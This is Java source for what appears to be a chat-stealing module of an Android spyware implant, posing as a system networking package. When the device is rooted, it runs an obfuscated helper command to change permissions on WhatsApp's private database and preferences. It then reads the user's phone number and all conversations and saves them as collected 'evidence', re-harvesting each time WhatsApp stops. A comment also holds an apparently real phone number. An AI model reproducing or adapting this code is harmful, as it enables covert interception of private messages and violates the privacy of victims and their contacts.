package com.android.networking.module;

import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.FactoryConfigurationError;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;
import org.xmlpull.v1.XmlPullParser;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.os.Message;
import android.util.Pair;
import android.util.Xml;

import com.android.networking.Messages;
import com.android.networking.ProcessInfo;
import com.android.networking.ProcessStatus;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.capabilities.XmlParser;
import com.android.networking.conf.ConfModule;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.evidence.EvDispatcher;

import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.Markup;
import com.android.networking.file.AutoFile;
import com.android.networking.interfaces.Observer;
import com.android.networking.listener.ListenerProcess;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DateTime;
import com.android.networking.util.StringUtils;
import com.android.networking.util.WChar;

public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
	class CMessage {

		public String data;
		public Date timestamp;
		public boolean from_me;

		public CMessage(String data, Date date, boolean from_me) {
			this.data=data;
			this.timestamp=date;
			this.from_me=from_me;
		}
	}

	private static final String TAG = "ModuleChat";

	private static final int PROGRAM_WHATSAPP = 0x06;

	String pObserving = "whatsapp";
	Markup markupChat;

	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();

	private String myPhoneNumber="me";

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse), don't have root, bailing out");
			}
			return false;
		}
	}

	@Override
	protected void actualGo() {
		// check for whatsapp activities
		// open db msgstore /data/data/com.whatsapp/databases/msgstore.db
		// open table chat_list
		// per ogni entry leggere l'ultimo messaggio letto.
		// open table messages
	}

	@Override
	protected void actualStart() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		markupChat = new Markup(this);
		hastableConversationLastIndex = new Hashtable<String, Integer>();
		try {
			myPhoneNumber = readMyPhoneNumber();
			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);
			
			if (markupChat.isMarkup()) {
				hastableConversationLastIndex = (Hashtable<String, Integer>) markupChat.readMarkupSerializable();
				Enumeration<String> keys = hastableConversationLastIndex.keys();

				while (keys.hasMoreElements()) {
					String key = keys.nextElement();
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
					}
				}
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart), get all Chats");
				}
			
				readChatMessages();
			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart), " + e);
			}
		}
		ListenerProcess.self().attach(this);
	}



	@Override
	protected void actualStop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStop)");
		}
		ListenerProcess.self().detach(this);
	}

	@Override
	public int notification(ProcessInfo process) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification): " + process);
		}
		if (process.processInfo.processName.contains(pObserving)) {
			if (process.status == ProcessStatus.STOP) {
				try {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
					}
					readChatMessages();
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (notification) Error: " + e);
					}
				}
			}
		}
		return 0;
	}
	
	private String readMyPhoneNumber() {
		// f_d=/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml
		/* <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
		<map>
		<string name="com.whatsapp.RegisterPhone.phone_number">3938980634</string>
		<int name="com.whatsapp.RegisterPhone.country_code_position" value="-1" />
		<boolean name="com.whatsapp.RegisterPhone.no_self_send" value="false" />
		<int name="com.whatsapp.RegisterPhone.verification_state" value="14" />
		<int name="com.whatsapp.RegisterPhone.phone_number_position" value="10" />
		<string name="com.whatsapp.RegisterPhone.input_country_code">39</string>
		<string name="com.whatsapp.RegisterPhone.input_phone_number">393 898 0634</string>
		<string name="com.whatsapp.RegisterPhone.prev_country_code">39</string>
		<string name="com.whatsapp.RegisterPhone.country_code">39</string>
		<string name="com.whatsapp.RegisterPhone.prev_phone_number">3938980634</string>
		</map> */

		String filename = Messages.getString("f_d");
		try {
			Runtime.getRuntime().exec(Messages.getString("f_2") + filename);
			File file = new File(filename);
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber): " + file.getAbsolutePath());
			}

			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
			//Element root = doc.getDocumentElement();
			//root.getElementsByTagName("string");
			
			doc.getDocumentElement().normalize();
			NodeList stringNodes = doc.getElementsByTagName("string");
			for(int i =0; i< stringNodes.getLength(); i++){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), node: " + i);
				}
				Node node = stringNodes.item(i);
				NamedNodeMap attrs = node.getAttributes();
				Node item = attrs.getNamedItem("name");
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " +item.getNodeValue());
				}
				//f_e=com.whatsapp.RegisterPhone.phone_number
				if(item!= null && Messages.getString("f_e").equals(item.getNodeValue())){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found: " + item);
					}
					String myPhone = node.getFirstChild().getNodeValue();
					return myPhone;
				}
			}
			
		} catch (Exception e) {
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), ERROR: " + e);
			}
		} 

		return "me";
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	private synchronized void readChatMessages() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}
		boolean updateMarkup = false;
		// f.0=/data/data/com.whatsapp/databases
		String dbDir = Messages.getString("f_0");
		// f.1=/msgstore.db
		String dbFile = dbDir + Messages.getString("f_1");
		// changeFilePermission(dbFile,777);
		// f.2=/system/bin/ntpsvd pzm 777 
		Runtime.getRuntime().exec(Messages.getString("f_2") + dbDir);
		Runtime.getRuntime().exec(Messages.getString("f_2") + dbFile);
		File file = new File(dbFile);
		if (file.canRead()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): can read DB");
			}
			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile);
			SQLiteDatabase db = helper.getReadableDatabase();

			// retrieve a list of all the conversation changed from the last
			// reading. Each conversation contains the peer and the last id
			ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);

			// for every conversation, fetch and save message and update markup
			for (Pair<String, Integer> pair : changedConversations) {
				String conversation = pair.first;
				int lastReadIndex = pair.second;

				int newLastRead = fetchMessages(db, conversation, lastReadIndex);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): fetchMessages " + conversation + ":" + lastReadIndex
							+ " newLastRead " + newLastRead);
				}
				hastableConversationLastIndex.put(conversation, newLastRead);
				if (Cfg.DEBUG) {
					Check.asserts(hastableConversationLastIndex.get(conversation) > 0,
							" (readChatMessages) Assert failed, zero index");
				}
				updateMarkup = true;
			}

			if (updateMarkup) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): updating markup");
				}
				markupChat.writeMarkupSerializable(hastableConversationLastIndex);
			}

			db.close();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
			}
		}
	}

	/**
	 * Retrieves the list of the conversations and their last read message.
	 * @param db
	 * @return
	 */
	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchChangedConversation)");
		}

		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();

		// CREATE TABLE chat_list (_id INTEGER PRIMARY KEY AUTOINCREMENT, key_remote_jid TEXT UNIQUE, message_table_id INTEGER)
		
		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.3=chat_list
		queryBuilderIndex.setTables(Messages.getString("f_3"));
		// queryBuilder.appendWhere(inWhere);
		// f.4=_id
		// f.5=key_remote_jid
		// f.6=message_table_id
		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_6") };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			// f.5=key_remote_jid
			String jid = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f_5")));
			// f.6=message_table_id
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f_6")));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if conversation is known, get the last read index
			if (hastableConversationLastIndex.containsKey(jid)) {

				lastReadIndex = hastableConversationLastIndex.get(jid);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
				}
			}

			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
			}

		}
		cursor.close();
		return changedConversations;
	}

	/**
	 * Fetch unread messages of a specific conversation
	 * @param db
	 * @param conversation
	 * @param lastReadIndex
	 * @return
	 */
	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
		}
		// CREATE TABLE messages (_id INTEGER PRIMARY KEY AUTOINCREMENT, key_remote_jid TEXT NOT NULL, key_from_me INTEGER, key_id TEXT NOT NULL, status INTEGER, needs_push INTEGER, data TEXT, timestamp INTEGER, media_url TEXT, media_mime_type TEXT, media_wa_type TEXT, media_size INTEGER, media_name TEXT, media_hash TEXT, latitude REAL, longitude REAL, thumb_image TEXT, remote_resource TEXT, received_timestamp INTEGER, send_timestamp INTEGER, receipt_server_timestamp INTEGER, receipt_device_timestamp INTEGER, raw_data BLOB)
		
		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.a=messages
		queryBuilderIndex.setTables(Messages.getString("f_a"));
		// f.4=_id
		// f.5=key_remote_jid
		queryBuilderIndex.appendWhere(Messages.getString("f_5")+" = '" + conversation + "' AND "+ Messages.getString("f_4") +" > " + lastReadIndex);
		// f.7=data
		// f_b=timestamp
		// f_c=key_from_me
		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_7"), Messages.getString("f_b"), Messages.getString("f_c") };
		
		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation AND key_remote_jid>$lastReadIndex
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, Messages.getString("f_4"));
		
		ArrayList<CMessage> messages = new ArrayList<CMessage>();
		int lastRead = lastReadIndex;
		while (cursor != null && cursor.moveToNext()) {		
			int index = cursor.getInt(0); // f_4
			String data = cursor.getString(2); // f_7
			Long timestamp = cursor.getLong(3); // f_b
			boolean from_me = cursor.getInt(4) == 1; // f_c
			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data );
			}
			lastRead = Math.max(index, lastRead);
			if(data != null){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(data.getBytes()));
				}
				messages.add(new CMessage(data, new Date(timestamp), from_me));

			}
		}
		cursor.close();
		saveEvidence(conversation, messages);
		return lastRead;
	}

	private void saveEvidence(String conversation, ArrayList<CMessage> messages) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence): " + conversation);
		}
		
		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		for (CMessage message : messages) {
			DateTime datetime = new DateTime(message.timestamp);

			String peer = conversation.replaceAll(Messages.getString("f_9"),"");
			
			// TIMESTAMP
			items.add(datetime.getStructTm());
			// PROGRAM_TYPE
			items.add(ByteArray.intToByteArray(PROGRAM_WHATSAPP));
			// FLAGS
			int incoming = message.from_me? 0x00 : 0x01;
			items.add(ByteArray.intToByteArray(incoming));
			// FROM
			String from = message.from_me? myPhoneNumber : peer ; 
			items.add(WChar.getBytes(from, true));
			// TO
			String to = message.from_me? peer : myPhoneNumber; 
			items.add(WChar.getBytes(to, true));
			// CONTENT
			items.add(WChar.getBytes(message.data, true));
			items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveEvidence): " + datetime.toString() + " " + from + " : " + message.data);
			}
		}

		EvidenceReference.atomic(EvidenceType.CHATNEW, items);
	}

}
